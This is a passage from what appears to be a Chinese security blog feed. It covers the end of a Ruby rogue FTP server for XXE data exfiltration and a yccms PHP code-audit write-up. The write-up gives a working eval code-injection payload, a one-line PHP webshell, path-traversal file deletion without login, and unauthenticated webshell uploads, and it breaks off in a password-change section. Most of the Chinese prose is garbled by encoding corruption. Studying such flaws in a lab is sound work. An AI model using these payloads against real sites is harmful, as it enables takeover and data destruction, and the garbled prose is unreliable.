connected&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;220 xxe-ftp-server&quot;</span>)<br>loop &#123;<br>req = ftp_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&lt; &quot;</span>+req<br><span class="hljs-built_in">log</span>.write <span class="hljs-string">&quot;get req: #&#123;req.inspect&#125;\n&quot;</span><br><br><span class="hljs-keyword">if</span> req.include? <span class="hljs-string">&quot;LIST&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;150 Opening BINARY mode data connection for /bin/ls&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;226 Transfer complete.&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;USER&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;331 password please - version check&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;PORT&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;! PORT received&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 200 PORT command ok&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;200 PORT command ok&quot;</span>)<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 230 more data please!&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;230 more data please!&quot;</span>)<br>end<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. Connection closed&quot;</span><br>  end<br>end<br>end<br><br>loop <span class="hljs-keyword">do</span><br>sleep(<span class="hljs-number">10000</span>)<br>end<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li>ä»£ç å®¡è®¡ä¸€èˆ¬åªéœ€è¦é€šè¿‡æ‰“DNSå¾—åˆ°è®¿é—®è®°å½•åˆ¤æ–­æ­¤æ¼æ´å­˜åœ¨å³å¯</li><li>å®é™…åˆ©ç”¨æ­¤æ¼æ´(æ— å›æ˜¾)éœ€è¦é€šè¿‡dnså¤–å¸¦æ•°æ®å¾—åˆ°æ•æ„Ÿä¿¡æ¯</li><li>httpä¼ è¾“ä¸€èˆ¬åªä¼šè¯»å–æ–‡ä»¶ç¬¬ä¸€è¡Œï¼Œå¯ä»¥é€šè¿‡å¼€å¯æ¶æ„ftpæœåŠ¡è¯»å–æ¢è¡Œæ–‡ä»¶</li></ol>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccmsä»£ç å®¡è®¡(php)</title>
    <link href="/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h1 id="yccmsä»£ç å®¡è®¡-php"><a href="#yccmsä»£ç å®¡è®¡-php" class="headerlink" title="yccmsä»£ç å®¡è®¡(php)"></a>yccmsä»£ç å®¡è®¡(php)</h1><h3 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h3><ul><li>æ›´æ”¹config.inc.phpå¯¹åº”çš„æ•°æ®åº“åï¼Œç”¨æˆ·ååŠå¯†ç å³å¯</li><li>è¿è¡Œyccms.sqlæ–‡ä»¶ï¼Œåœ¨æ•°æ®åº“ä¸­å¯¼å…¥sqlæ•°æ®</li><li>è®¿é—®http:&#x2F;&#x2F;åŸŸå&#x2F;adminï¼Œç”¨æˆ·ååŠå¯†ç éƒ½ä¸ºadminï¼Œç™»å½•åå°</li></ul><h3 id="é…ç½®xdebug"><a href="#é…ç½®xdebug" class="headerlink" title="é…ç½®xdebug"></a>é…ç½®xdebug</h3><h4 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h4><ul><li><p><a href="https://segmentfault.com/a/1190000018961750">2024å¹´æ›´æ–°ï¼ŒPhpStormé…ç½®Xdebugæœ€å®Œæ•´æœ€è¯¦è§£æ•™ç¨‹ï¼Œ100%æˆåŠŸï¼ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦</a></p></li><li><p>å°è¿ªå®‰å…¨phpä»£ç å®¡è®¡è¯¾ç¨‹ day108</p></li><li><p><a href="https://mp.weixin.qq.com/s/7K8edea8imalZ8_jJp3ODw">phpstorm+phpstudy é…ç½®xdebug (qq.com)</a></p></li></ul><h4 id="è¯¦ç»†æ­¥éª¤ï¼š"><a href="#è¯¦ç»†æ­¥éª¤ï¼š" class="headerlink" title="è¯¦ç»†æ­¥éª¤ï¼š"></a>è¯¦ç»†æ­¥éª¤ï¼š</h4><ul><li><p>phpstormå·¦ä¸Šè§’file(èœå•)-&gt;setting(è®¾ç½®)-&gt;php-&gt;sever</p><p>æ–°å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼Œåç§°ä»»æ„ï¼Œç«¯å£ä¸ç½‘ç«™æ­å»ºç«¯å£ä¸€è‡´</p><p><img src="/img/yccms/yccms02.png" alt="å›¾ç‰‡"></p></li><li><p>phpstormå·¦ä¸Šè§’file(èœå•)-&gt;setting(è®¾ç½®)-&gt;php-&gt;Debug(è°ƒè¯•)</p><p>è®¾ç½®ç«¯å£å·ä¸º9100ï¼Œé˜²æ­¢ç«¯å£è¿›ç¨‹å†²çª</p><p><img src="/img/yccms/yccms03.png" alt="å›¾ç‰‡"></p><p>è°ƒè¯•ä¸‹çš„DBGpæŒ‰ç…§å¦‚å›¾è®¾ç½®ï¼Œç«¯å£ä¸åˆšåˆšè®¾ç½®çš„è°ƒè¯•ç«¯å£ç›¸å¯¹åº”</p><p><img src="/img/yccms/yccms04.png" alt="å›¾ç‰‡"></p><p>æ‰“å¼€phpstudyï¼ŒæŸ¥çœ‹ç½‘ç«™ä½¿ç”¨çš„phpç‰ˆæœ¬</p><p>åœ¨è½¯ä»¶ç®¡ç†é€‰é¡¹ä¸­æ‰¾åˆ°å¯¹åº”çš„phpç‰ˆæœ¬ï¼Œç‚¹å‡»è®¾ç½®</p><p>æ‰“å¼€xdebugè°ƒè¯•ç»„ä»¶ï¼Œç«¯å£ç›‘å¬ä¸åˆšåˆšè®¾ç½®çš„è°ƒè¯•ç«¯å£è®¾ä¸ºä¸€è‡´</p><p><img src="/img/yccms/yccms05.png" alt="å›¾ç‰‡"></p></li><li><p>phpstormå·¦ä¸Šè§’file(èœå•)-&gt;setting(è®¾ç½®)-&gt;php</p><p>å°†ç‰ˆæœ¬è®¾ç½®ä¸ºä¸åˆšåˆšåœ¨phpstudyä¸­æŸ¥çœ‹çš„æ­¤ç½‘ç«™ä½¿ç”¨çš„phpç‰ˆæœ¬</p><p><img src="/img/yccms/yccms06.png" alt="å›¾ç‰‡"></p></li><li><p>å³ä¸Šè§’æ·»åŠ é…ç½®ä¸­é€‰æ‹©phpç½‘é¡µæ·»åŠ é…ç½®</p><p><img src="/img/yccms/yccms07.png" alt="å›¾ç‰‡"></p></li></ul><h3 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h3><h4 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h4><p><img src="/img/yccms/yccms01.png" alt="å›¾ç‰‡"></p><p>å¯ä»¥çœ‹å‡ºæ­¤æºç æ˜¯MVCç»“æ„ï¼Œæœ€æ ¸å¿ƒçš„æ§åˆ¶ä»£ç åœ¨controllerä¸modelæ–‡ä»¶å¤¹å†…</p><p>ç¿»çœ‹ç›®å½•å‘ç°æ­¤æºç ä½¿ç”¨äº†smartyæ¨¡æ¿ï¼Œéšåå¯ä»¥æŸ¥çœ‹æ˜¯å¦å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥</p><h4 id="è·¯ç”±å…³ç³»"><a href="#è·¯ç”±å…³ç³»" class="headerlink" title="è·¯ç”±å…³ç³»"></a>è·¯ç”±å…³ç³»</h4><ul><li><p>?a&#x3D;admin&amp;m&#x3D;update</p><p>keyå€¼ä¸ºaä¼ å…¥ç±»åï¼Œkeyå€¼ä¸ºmä¼ å…¥æ–¹æ³•å</p></li></ul><h4 id="æ¼æ´å¤ç°-æœ‰å…¥å£ï¼Œæ‰å¯åˆ©ç”¨"><a href="#æ¼æ´å¤ç°-æœ‰å…¥å£ï¼Œæ‰å¯åˆ©ç”¨" class="headerlink" title="æ¼æ´å¤ç°(æœ‰å…¥å£ï¼Œæ‰å¯åˆ©ç”¨)"></a>æ¼æ´å¤ç°(æœ‰å…¥å£ï¼Œæ‰å¯åˆ©ç”¨)</h4><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/KRookieSec/p/17142265.html">è®°ä¸€æ¬¡å®Œæ•´çš„PHPä»£ç å®¡è®¡â€”â€”yccms v3.4å®¡è®¡ - KRookieSec - åšå®¢å›­ (cnblogs.com)</a></p><p>â€‹   <a href="https://xz.aliyun.com/news/9362">ä»£ç å®¡è®¡â€”YCCMSç³»ç»Ÿ-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>ä½¿ç”¨seayè¿›è¡Œè‡ªåŠ¨åŒ–å®¡è®¡ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨æ¼æ´çš„åœ°æ–¹ï¼Œé€ä¸ªæµ‹è¯•</p><p><img src="/img/yccms/yccms08.png" alt="å›¾ç‰‡"></p><h5 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h5><p>æ‰¾åˆ°æ­¤æ–¹æ³•æ˜¯å¦æœ‰è¢«å®ä¾‹åŒ–</p><p>å‘ç°run.inc.phpå®ä¾‹åŒ–æ­¤æ–¹æ³•ï¼Œadmin&#x2F;index.phpåŒ…å«äº†æ­¤æ–‡ä»¶</p><p>public&#x2F;classç›®å½•ä¸‹çš„Factory.class.phpæ–‡ä»¶ï¼Œæ–‡ä»¶ç±»åä¸ºFactory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setModel</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_a</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/model/&#x27;</span>.<span class="hljs-variable">$_a</span>.<span class="hljs-string">&#x27;Model.class.php&#x27;</span>)) <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Model();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>evalå‡½æ•°å†…å˜é‡å¯æ§</p><p>éœ€è¦ä¼ å…¥ä¸€ä¸ªç±»åï¼Œå¹¶ä¸”æ»¡è¶³(æˆ–ç»•è¿‡)file_exists()å‡½æ•°çš„æ£€æŸ¥</p><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();phpinfo();//../<br></code></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ol><li>è°ƒç”¨Factory()ç±»ä¸­æ–¹æ³•</li><li>ç”¨;éš”å¼€ä»¥æ‰§è¡Œä¸‹ä¸€æ¡è¯­å¥</li><li>&#x2F;..&#x2F;è·³è‡³ä¸Šä¸€çº§ç»•è¿‡file_exist()å‡½æ•°æ£€æµ‹</li></ol><p>é¡ºåˆ©æ³¨å…¥</p><p><img src="/img/yccms/yccms10.png" alt="å›¾ç‰‡"></p><p>å°è¯•å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();@eval($_POST[v]);//../<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€äº›æ–‡ç« æ˜¯å¯ä»¥é¡ºåˆ©è¿æ¥çš„ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰æˆåŠŸ</p><h5 id="æ— éœ€ç™»å½•æ–‡ä»¶åˆ é™¤"><a href="#æ— éœ€ç™»å½•æ–‡ä»¶åˆ é™¤" class="headerlink" title="æ— éœ€ç™»å½•æ–‡ä»¶åˆ é™¤"></a>æ— éœ€ç™»å½•æ–‡ä»¶åˆ é™¤</h5><p>controller&#x2F;PicAction.class.phpæ–‡ä»¶ä¸­æ§åˆ¶åˆ é™¤åŠŸèƒ½çš„æ–¹æ³•æ²¡æœ‰å¯¹æ–‡ä»¶ååŠæ–‡ä»¶è·¯å¾„çš„æ£€æµ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå…¬å…±æ–¹æ³• delallï¼Œç”¨äºåˆ é™¤å›¾ç‰‡</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123; <span class="hljs-comment">// å¦‚æœè¡¨å•æäº¤äº†ï¼ˆsend å‚æ•°å­˜åœ¨ï¼‰</span><br>        <span class="hljs-comment">// å¦‚æœ pid å‚æ•°ä¸ºç©ºï¼ˆå³ç”¨æˆ·æ²¡æœ‰é€‰æ‹©ä»»ä½•å›¾ç‰‡ï¼‰</span><br>        <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) <br>            <span class="hljs-comment">// å¼¹å‡ºè­¦å‘Šæ¡†æç¤ºâ€œæ²¡æœ‰é€‰æ‹©ä»»ä½•å›¾ç‰‡â€ï¼Œç„¶åè·³è½¬å› pic é¡µé¢</span><br>            tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;æ²¡æœ‰é€‰æ‹©ä»»ä½•å›¾ç‰‡!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><br>        <span class="hljs-variable">$_fileDir</span> = ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>; <span class="hljs-comment">// å›¾ç‰‡æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123; <span class="hljs-comment">// éå†æ‰€æœ‰è¦åˆ é™¤çš„å›¾ç‰‡æ–‡ä»¶å</span><br>            <span class="hljs-variable">$_filePath</span> = <span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>; <span class="hljs-comment">// æ„é€ å®Œæ•´çš„æ–‡ä»¶è·¯å¾„</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123; <span class="hljs-comment">// å°è¯•åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå¦‚æœå¤±è´¥</span><br>                <span class="hljs-comment">// å¼¹å‡ºè­¦å‘Šæ¡†æç¤ºâ€œå›¾ç‰‡åˆ é™¤å¤±è´¥â€ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º 777</span><br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å›¾ç‰‡åˆ é™¤å¤±è´¥,è¯·è®¾æƒé™ä¸º777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// åˆ é™¤æˆåŠŸåï¼Œç«‹å³é‡å®šå‘å› pic é¡µé¢</span><br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä»–æ–‡ä»¶æœ‰æ–‡ä»¶è·¯å¾„æ£€æµ‹ï¼Œå¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;\\&#x27;</span>.<span class="hljs-variable">$_navname</span>.<span class="hljs-string">&#x27;\\&#x27;</span>);<br></code></pre></td></tr></table></figure><p>å¼€å§‹æµ‹è¯•</p><p>å¯»æ‰¾ç½‘ç«™åŠŸèƒ½ç‚¹ï¼šå…¶ä»–åŠŸèƒ½-&gt;å›¾ç‰‡ç®¡ç†</p><p>ç‚¹å‡»åˆ é™¤æŒ‰é’®åæŠ“å–æ•°æ®åŒ…ï¼Œå¾—åˆ°æ•°æ®åŒ…å†…å®¹</p><p><img src="/img/yccms/yccms11.png" alt="å›¾ç‰‡"></p><p>sendå€¼æ˜¯urlç¼–ç è¿‡çš„ï¼Œè§£ç åä¸ºåˆ é™¤é€‰ä¸­å›¾ç‰‡</p><p>pidåurlç¼–ç è§£ç åä¸º[0]</p><p>é€€å‡ºadminè´¦æˆ·çš„ç™»é™†åï¼Œå°†ç½‘ç«™æ ¹ç›®å½•ä¸‹CMSç³»ç»Ÿå®‰è£…å£°æ˜æ–‡ä»¶é‡å‘½åä¸ºCMS(ä¸€ä¼šæµ‹è¯•æ—¶æ— éœ€å†å¯¹ä¸­æ–‡urlç¼–ç )</p><p>æ›´æ”¹æ•°æ®åŒ…pid[0]å‚æ•°çš„å€¼ä¸º&#x2F;..&#x2F;CMSï¼Œå‘é€æ•°æ®åŒ…ï¼Œå‘ç°æˆåŠŸåˆ é™¤æ–‡ä»¶</p><h5 id="æ— éœ€ç™»å½•æ–‡ç« åˆ é™¤"><a href="#æ— éœ€ç™»å½•æ–‡ç« åˆ é™¤" class="headerlink" title="æ— éœ€ç™»å½•æ–‡ç« åˆ é™¤"></a>æ— éœ€ç™»å½•æ–‡ç« åˆ é™¤</h5><p>controller&#x2F;ArticleAction.class.php</p><p>æ¼æ´ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;æ²¡æœ‰é€‰æ‹©ä»»ä½•å†…å®¹!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//å…ˆåˆ é™¤é™æ€æ–‡ä»¶</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;é™æ€æ–‡ä»¶åˆ é™¤å¤±è´¥,è¯·è®¾æƒé™ä¸º777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç å¯ä»¥çœ‹åˆ°åŸºæœ¬ä¸Šæ˜¯æ²¡æœ‰æ£€æµ‹çš„ï¼Œä¼ å…¥idå³å¯åˆ é™¤å¯¹åº”çš„æ–‡ç« ï¼Œä½†æ˜¯ç”±äºå˜é‡æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åªèƒ½åˆ é™¤æ–‡ç« </p><p>ä¸èƒ½åˆ é™¤å…¶ä»–æ–‡ä»¶</p><p>å¼€å§‹æµ‹è¯•ï¼š</p><p>å¯»æ‰¾åŠŸèƒ½ç‚¹ï¼šå†…å®¹ç®¡ç†-&gt;æ–‡ç« åˆ—è¡¨</p><p>ç‚¹å‡»åˆ é™¤æŠ“å–æ•°æ®åŒ…</p><p><img src="/img/yccms/yccms13.png" alt="å›¾ç‰‡"></p><p>çœ‹åˆ°æ˜¯ç›´æ¥getä¼ å‚ï¼Œæ›´æ”¹idçš„å€¼å°±å¯ä»¥çš„</p><p>é€€å‡ºç™»å½•åæ›´æ”¹idå‘é€æ•°æ®åŒ…ï¼Œå†æ¬¡ç™»å½•æŸ¥çœ‹ï¼Œå‘ç°é¡ºåˆ©åˆ é™¤æ–‡ç« </p><h5 id="æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 01"><a href="#æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 01" class="headerlink" title="æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 01"></a>æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 01</h5><p>public&#x2F;class&#x2F;FileUpload.class.php</p><p>æŸ¥çœ‹æºä»£ç å‘ç°åªå¯¹ä¸Šä¼ å›¾ç‰‡ç±»å‹å’Œæ–‡ä»¶å¤§å°åšäº†åˆ¤æ–­ï¼Œå¹¶ä¸”è¿›è¡Œäº†é‡å‘½å</p><p>åœ¨ç½‘ç«™å¯»æ‰¾åŠŸèƒ½ç‚¹ï¼šç³»ç»Ÿè®¾ç½®-&gt;é¦–é¡µå†…å®¹</p><p>åœ¨ç¼–è¾‘å™¨è‡ªå¸¦çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹å¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶</p><p>æŠ“å–æ•°æ®åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹ï¼Œé¡ºåˆ©ä¸Šä¼ </p><p><img src="/img/yccms/yccms14.png" alt="å›¾ç‰‡"></p><p>ç”¨èšå‰‘æˆåŠŸè¿æ¥</p><p><img src="/img/yccms/yccms15.png" alt="å›¾ç‰‡"></p><p>ç»æµ‹è¯•ï¼Œé€€å‡ºç™»é™†åç›´æ¥å‘åŒ…ä¹Ÿå¯ä»¥æ­£å¸¸ä¸Šä¼ ï¼Œå¯ä»¥æ­£å¸¸è¿æ¥</p><h5 id="æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 02"><a href="#æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 02" class="headerlink" title="æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 02"></a>æ— éœ€ç™»å½•æ–‡ä»¶ä¸Šä¼ 02</h5><p>ç›´æ¥å¯»æ‰¾åŠŸèƒ½ç‚¹ï¼šç³»ç»Ÿè®¾ç½®-&gt;ä¸Šä¼ logo</p><p>æ‰¾åˆ°å¯¹åº”æ§åˆ¶ä»£ç </p><p><img src="/img/yccms/yccms16.png" alt="å›¾ç‰‡"></p><p>ä¸Šä¼ åçš„æ–‡ä»¶ä¼šè¢«é‡å‘½åä¸ºlogoï¼Œæ£€éªŒæ–‡ä»¶ç±»å‹çš„å‡½æ•°æå®¹æ˜“ç»•è¿‡</p><p>æ–¹æ³•åŒ01æŠ“å–æ•°æ®åŒ…åæ›´æ”¹æ–‡ä»¶å†…å®¹ä¸æ–‡ä»¶å</p><p>å¯ä»¥çœ‹åˆ°é¡ºåˆ©ä¸Šä¼ </p><p><img src="/img/yccms/yccms17.png" alt="å›¾ç‰‡"></p><p>ç”¨èšå‰‘æµ‹è¯•ä¾æ—§æ˜¯èƒ½å¤Ÿè¿æ¥æˆåŠŸ</p><p><img src="/img/yccms/yccms18.png" alt="å›¾ç‰‡"></p><p>é€€å‡ºç™»å½•ååŒæ ·å¯ä»¥å‘é€æ•°æ®åŒ…å¹¶ä¸”ç”¨èšå‰‘é¡ºåˆ©è¿æ¥</p><h5 id="ä»»æ„å¯†ç ä¿®æ”¹-æœªé‰´æƒ"><a href="#ä»»æ„å¯†ç ä¿®æ”¹-æœªé‰´æƒ" class="headerlink" title="ä»»æ„å¯†ç ä¿®æ”¹(æœªé‰´æƒ)"></a>ä»»æ„å¯†ç ä¿®æ”¹(æœªé‰´æƒ)</h5><p>controller&#x2F;AdminAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//åå°åˆå§‹</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 